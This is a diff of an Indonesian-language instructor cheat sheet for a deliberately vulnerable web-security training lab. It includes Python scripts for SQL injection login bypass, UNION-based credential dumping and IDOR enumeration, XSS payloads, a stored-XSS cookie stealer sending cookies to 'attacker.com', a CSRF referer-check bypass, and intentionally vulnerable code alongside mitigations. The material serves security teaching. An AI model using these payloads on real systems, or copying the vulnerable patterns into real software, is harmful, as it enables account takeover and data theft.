@@ -1,132 +1,193 @@
-# 🕵️ ACT LAB - Speaker & Instructor Cheat Sheet
+# 🕵️ ACT LAB - Instructor Cheat Sheet (HTB Edition)
 
-Dokumen ini berisi panduan teknis bagi pembicara untuk menjelaskan setiap kerentanan di ACT LAB. Gunakan panduan ini untuk demonstrasi dan penjelasan mendalam.
+Dokumen ini adalah panduan rahasia bagi instruktur/pembicara untuk mendemonstrasikan kerentanan di ACT LAB dengan gaya profesional ala HackTheBox.
 
 ---
 
-## 1. SQL Injection (Auth Bypass)
-**Lokasi Lab:** `/lab/sqli-login`  
-**Target:** Melewati form login tanpa mengetahui password.
+## 🛠️ Global Mission Setup
+- **Platform**: Node.js + SQLite (Persistent)
+- **UI Standard**: HTB-Dark Mode (Clean, High Contrast)
+- **Monitor Terminal**: Gunakan panel "Console Log" di setiap lab untuk memvisualisasikan request secara real-time di depan audiens.
 
-### 🚩 Payload:
-```sql
-' OR '1'='1' --
+---
+
+## 1. SQL Injection (Authentication Bypass)
+**Vulnerability Type**: In-band SQLi (Auth logic subversion)
+**Target**: `admin` account access without password.
+
+### 🚩 Exploitation Methods
+#### A. Manual (Browser)
+1. Buka halaman login.
+2. Masukkan username: `admin`
+3. Masukkan password: `' OR '1'='1`
+4. Klik Login.
+
+#### B. Automated (Python Script)
+```python
+import requests
+
+url = "http://target.com/api/auth/login"
+payload = {
+    "username": "admin",
+    "password": "' OR '1'='1"
+}
+
+r = requests.post(url, json=payload)
+if "flag" in r.text:
+    print(f"[+] Login Bypassed! Flag: {r.json()['flag']}")
 ```
 
-### 💻 Code Analysis (`api/auth.js`):
+### 💻 Vulnerable Code (`api/auth.js`)
 ```javascript
-// BARIS VULNERABLE:
 const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
-const result = await db.query(query);
+// Database mengeksekusi string mentah tanpa sanitasi.
 ```
-- **Kenapa?** Menggunakan string concatenation (penggabungan string) langsung dari input user.
-- **Bagaimana?** Karakter `'` menutup query asli, lalu `OR '1'='1'` membuat kondisi selalu TRUE. `--` menonaktifkan sisa query di belakangnya.
-- **Efek:** Database akan mengembalikan user pertama (biasanya admin), dan penyerang berhasil masuk.
+
+### 💡 Presentation Tips
+1. Masukkan password asal-asalan dulu (Gagal).
+2. Tunjukkan panel **Query Analyzer**, masukkan payload.
+3. Jelaskan bagaimana `'` menutup string dan `--` menonaktifkan sisa logika AND password.
+
+### 🛡️ Mitigation
+Gunakan **Parameterized Queries**:
+```javascript
+db.get('SELECT * FROM users WHERE username = ? AND password = ?', [username, password]);
+```
 
 ---
 
-## 2. SQL Injection (UNION Based)
-**Lokasi Lab:** `/lab/sqli-union` (Search bar)  
-**Target:** Mengekstrak data sensitif dari tabel lain (misal: tabel `users`).
+## 2. SQL Injection (UNION-Based Exfiltration)
+**Vulnerability Type**: In-band UNION SQLi
+**Target**: Mengekstrak seluruh database `users` (Username & Password).
 
-### 🚩 Payload:
-```sql
-' UNION SELECT id, username, password, email, 'user', 'avatar', 'bio', 0 FROM users --
+### 🚩 Exploitation Methods
+#### A. Manual (Browser)
+1. Di kolom search, masukkan: `' UNION SELECT id, username, password, email FROM users --`
+2. Hasil pencarian akan menampilkan isi tabel `users`.
+
+#### B. Automated (Python Script)
+```python
+import requests
+
+url = "http://target.com/api/search"
+payload = "' UNION SELECT id, username, password, email FROM users --"
+r = requests.get(url, params={"q": payload})
+
+if r.status_code == 200:
+    users = r.json()['results']
+    for user in users:
+        print(f"ID: {user['id']} | User: {user['username']} | Pass: {user['password']}")
 ```
 
-### 💻 Code Analysis (`api/search.js`):
+### 💻 Vulnerable Code (`api/search.js`)
 ```javascript
 const query = `SELECT id, title, description, category FROM challenges WHERE title LIKE '%${q}%'`;
 ```
-- **Kenapa?** Query menerima input `q` mentah-mentah.
-- **Bagaimana?** `UNION` menggabungkan hasil query asli dengan query baru buatan penyerang. Penyerang harus menyamakan jumlah kolom agar query tidak error.
-- **Efek:** Penyerang bisa melihat seluruh isi tabel user (termasuk password) langsung di hasil pencarian.
+
+### 💡 Presentation Tips
+- Tekankan pada **Matching Columns**. Tunjukkan error jika jumlah kolom tidak sama (4 kolom).
+- Sorot hasil pencarian yang tiba-tiba memunculkan kredensial admin di tengah daftar mission.
 
 ---
 
-## 3. Reflected XSS
-**Lokasi Lab:** `/lab/xss-reflected`  
-**Target:** Menjalankan script di browser user lain melalui URL.
+## 3. Reflected XSS (Execution Sink)
+**Vulnerability Type**: Reflected Cross-Site Scripting
+**Target**: Trigger alert atau pencurian session token.
 
-### 🚩 Payload:
+### 🚩 Exploitation Payloads
+- **Simple Alert**: `<script>alert(1)</script>`
+- **Flag Capture**: `<script>getFlag()</script>` (Trigger fungsi rahasia di lab)
+- **HTML Injection**: `<h1>HACKED</h1>`
+
+### 💻 Vulnerable Code (`views/labs/xss-reflected.html`)
+```javascript
+target.innerHTML = q; // Input URL langsung ditempel ke DOM tanpa escaping.
+```
+
+### 💡 Presentation Tips
+- Jelaskan konsep **Source** (URL Parameter) dan **Sink** (innerHTML).
+- Masukkan payload di URL, copy-paste URL tersebut ke tab baru untuk mensimulasikan link pancingan (phishing).
+
+---
+
+## 4. Stored XSS (Persistent Payload)
+**Vulnerability Type**: Stored Cross-Site Scripting (Second Order)
+**Target**: Menginfeksi semua pengunjung Guestbook.
+
+### 🚩 Exploitation Payloads
+- **Cookie Stealer Simulation**: 
 ```html
-<script>alert('XSS by ACT LAB')</script>
+<script>new Image().src="http://attacker.com/log?c="+document.cookie;</script>
+```
+- **Stealth Injection**: `<img src=x onerror=getFlag()>`
+
+### 💻 Vulnerable Code (`api/guestbook.js` & Frontend)
+```javascript
+// Server menyimpan input mentah ke DB.
+// Frontend merender dengan .innerHTML
+container.innerHTML = e.message;
 ```
 
-### 💻 Code Analysis (Frontend - `search.html`):
-```javascript
-// VULNERABLE:
-document.getElementById('searchQuery').innerHTML = `Results for: ${queryParam}`;
-```
-- **Kenapa?** Menggunakan `.innerHTML` untuk menampilkan input user tanpa melakukan sanitasi/escaping.
-- **Bagaimana?** Browser menganggap input user sebagai tag HTML aktif dan langsung mengeksekusinya.
-- **Efek:** Pencurian cookie (`document.cookie`), redirect paksa, atau deface ringan.
+### 💡 Presentation Tips
+- Post payload, lalu **Refresh Halaman**. Tunjukkan bahwa payload tetap ada (Persistent).
+- Jelaskan bahaya XSS Stored: penyerang tidak perlu mengirim link ke korban, korban hanya perlu membuka website resmi.
 
 ---
 
-## 4. Stored XSS
-**Lokasi Lab:** `/lab/xss-stored` (Guestbook)  
-**Target:** Script tersimpan di database dan tereksekusi oleh semua pengunjung.
+## 5. IDOR (Unauthorized Access)
+**Vulnerability Type**: Insecure Direct Object Reference
+**Target**: Mengintip bio rahasia user `Alice` (ID #2).
 
-### 🚩 Payload:
-```html
-<img src=x onerror=alert('StoredXSS')>
+### 🚩 Exploitation Methods
+#### A. Manual (Browser)
+1. Ganti angka di input ID menjadi `2` (ID Alice).
+2. Klik **Enumerate Profile**.
+
+#### B. Automated (Python Script)
+```python
+import requests
+
+base_url = "http://target.com/api/profile"
+for i in range(1, 10):
+    r = requests.get(base_url, params={"id": i})
+    if r.status_code == 200:
+        data = r.json()['user']
+        print(f"[ID {i}] Found: {data['username']} - Bio: {data['bio']}")
+        if "ACT{" in data['bio']:
+            print(f"!!! FLAG FOUND: {data['bio']}")
 ```
 
-### 💻 Code Analysis (Frontend - `guestbook.html`):
+### 💻 Vulnerable Code (`api/profile.js`)
 ```javascript
-// VULNERABLE:
-div.innerHTML = `<strong>${entry.author}</strong>: ${entry.message}`;
+// Kode hanya mengecek ID, tidak mengecek hak akses (Authorization).
+const user = db.get('SELECT * FROM users WHERE id = ?', [req.query.id]);
 ```
-- **Kenapa?** Data dari database (yang dikirim user lain) ditampilkan menggunakan `.innerHTML`.
-- **Bagaimana?** Penyerang memposting pesan berisi script. Pesan ini disimpan permanen di database dan muncul di browser siapapun yang membuka halaman Guestbook.
-- **Efek:** Sangat berbahaya karena bisa menyebar secara otomatis (Worm) atau mencuri sesi semua pengunjung.
+
+### 💡 Presentation Tips
+- Sebutkan bahwa IDOR adalah kerentanan API paling umum saat ini.
+- Tekankan bahwa **Authentication** (Login) sudah benar, tapi **Authorization** (Hak Akses) yang lupakan.
 
 ---
 
-## 5. CSRF (Cross-Site Request Forgery)
-**Lokasi Lab:** `/lab/csrf`  
-**Target:** Memaksa user melakukan aksi (ganti email) tanpa sepengetahuan mereka.
+## 6. CSRF (Origin Bypass)
+**Vulnerability Type**: Cross-Site Request Forgery
+**Target**: Memaksa admin mengganti email tanpa sadar.
 
-### 🚩 Prosedur:
-1. Buat file HTML lokal di komputer penyerang.
-2. Buat form yang melakukan `POST` ke `/api/profile` target.
-3. Gunakan URL yang mengandung nama domain target agar lolos pengecekan `.includes()`.
+### 🚩 Exploitation Strategy
+Server mengecek referer menggunakan `.includes('act-lab')`. Penyerang bisa bypass dengan:
+1. Menaruh file exploit di folder bernama `act-lab`.
+2. Menamai domain/subdomain penyerang mengandung kata `act-lab`.
 
-### 💻 Code Analysis (`api/profile.js`):
-```javascript
-// WEAK PROTECTION:
-const referer = req.headers.referer || '';
-if (!referer.includes('act-lab')) {
-  return res.status(403).json({ error: 'Origin not allowed' });
-}
-```
-- **Kenapa?** Menggunakan `.includes()` adalah cara yang sangat lemah untuk memverifikasi origin.
-- **Bagaimana?** Penyerang bisa memberi nama file eksploitnya `act-lab-exploit.html`. Karena string `act-lab` ada di URL referer, server mengizinkan request tersebut.
-- **Efek:** Penyerang bisa mengganti email/password user lain jika user tersebut sedang login di tab sebelah.
+### 💡 Presentation Tips
+- Tunjukkan log terminal. Saat instruktur klik "Update", tunjukkan origin requestnya.
+- Jelaskan bahwa `.includes()` adalah "Lazy Check" yang sangat berbahaya.
 
 ---
 
-## 6. IDOR (Insecure Direct Object Reference)
-**Lokasi Lab:** `/lab/idor`  
-**Target:** Melihat data profil user lain dengan mengganti ID.
-
-### 🚩 Langkah:
-Ganti URL `/api/profile/1` menjadi `/api/profile/2`, `/api/profile/3`, dst.
-
-### 💻 Code Analysis (`api/profile.js`):
-```javascript
-router.get('/:id', async (req, res) => {
-  const result = await db.query('SELECT * FROM users WHERE id = $1', [req.params.id]);
-  res.json(result.rows[0]);
-});
-```
-- **Kenapa?** Server memberikan data berdasarkan ID tanpa mengecek apakah user yang meminta adalah pemilik data tersebut.
-- **Efek:** Kebocoran data pribadi (Email, Bio, ID) seluruh user di sistem.
+## 🚀 Pro Speaker Notes
+- **Always Keep the Logs Open**: Peserta seminar sangat suka melihat "apa yang terjadi di balik layar".
+- **Real World Impact**: Di setiap lab, sebutkan satu kasus nyata (misal: "XSS ini mirip dengan bug di Facebook tahun 2018").
+- **Call to Action**: Akhiri setiap demo dengan "Sekarang mari kita lihat cara memperbaikinya".
 
 ---
-
-## 💡 Pesan untuk Pembicara:
-- **Prinsip Dasar**: Selalu tekankan bahwa kerentanan terjadi karena **"Trusting User Input"**.
-- **Solusi**: Jelaskan cara perbaikannya (Parameterized Query untuk SQLi, Escaping/DOMPurify untuk XSS, dan CSRF Tokens untuk CSRF).
-- **Demo**: Tunjukkan Live Logs di terminal agar peserta bisa melihat bagaimana request tersebut sampai ke server.
+**ACT LAB - 2026 National Seminar Series**
